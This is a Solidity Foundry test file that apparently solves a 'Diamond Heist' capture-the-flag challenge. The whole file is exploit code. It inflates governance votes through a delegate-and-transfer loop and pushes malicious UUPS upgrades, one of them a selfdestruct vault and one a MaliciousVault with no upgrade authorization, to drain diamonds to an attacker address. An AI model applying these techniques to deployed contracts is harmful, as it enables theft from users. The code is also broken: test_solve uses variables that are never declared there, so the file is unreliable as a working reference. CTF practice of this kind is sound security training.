// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Challenge} from "../src/Challenge.sol";

import {HexensCoin} from "../src/HexensCoin.sol";
import {Diamond} from "../src/Diamond.sol";
import {Vault} from "../src/Vault.sol";
import {UUPSUpgradeable} from "../src/openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";


contract Exploit {
    function delegateAndTransfer(HexensCoin hexensCoin, address to) public {
        hexensCoin.delegate(to);
        hexensCoin.transfer(to, 10_000 ether);
    }
}

contract MaliciousVault is UUPSUpgradeable {
    function transfer(Diamond diamond, address to, uint256 amount) public {
        diamond.transfer(to, amount);
    }

    function _authorizeUpgrade(address) internal override view {
    }
}

contract NewVault is UUPSUpgradeable {

    function transfer() public {
        selfdestruct(payable(msg.sender));
    }

    function _authorizeUpgrade(address) internal override view {
    }
}



contract DiamondHeist is Test {
    Challenge public challenge;

    address ALICE = makeAddr("Alice");

    function setUp() public {
        challenge = new Challenge(ALICE);
    }


    function test_setupEverything() public {
        // empty test

        challenge.claim();
        HexensCoin hexensCoin = challenge.hexensCoin();

        hexensCoin.delegate(address(this));

        for(uint i=0; i<11; i++){
            Exploit exploit = new Exploit();
            hexensCoin.transfer(address(exploit), 10_000 ether);
            exploit.delegateAndTransfer(hexensCoin, address(this));
        }

        Diamond diamond = challenge.diamond();

        NewVault newVault = new NewVault();
        Vault vault = challenge.vault();

        bytes memory burnCall = abi.encodeWithSelector(Vault.burn.selector, address(diamond), 31337);

        challenge.vault().governanceCall(burnCall);

        bytes memory data = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(newVault));

        challenge.vault().governanceCall(data);

        NewVault(address(challenge.vault())).transfer();


    }

    function test_solve() public {

        vm.roll(block.number + 1);

        console.log("code size of vault: ", address(challenge.vault()).code.length);

        challenge.vaultFactory().createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));

        challenge.vault().initialize(address(hexensCoin), address(diamond));

        MaliciousVault maliciousVault = new MaliciousVault();

        data = abi.encodeWithSelector(UUPSUpgradeable.upgradeToAndCall.selector, address(maliciousVault), abi.encodeWithSelector(MaliciousVault.transfer.selector, diamond, ALICE, 31337));

        challenge.vault().governanceCall(data);

        console.log("Diamond balance of ALICE:", diamond.balanceOf(ALICE));

    }


}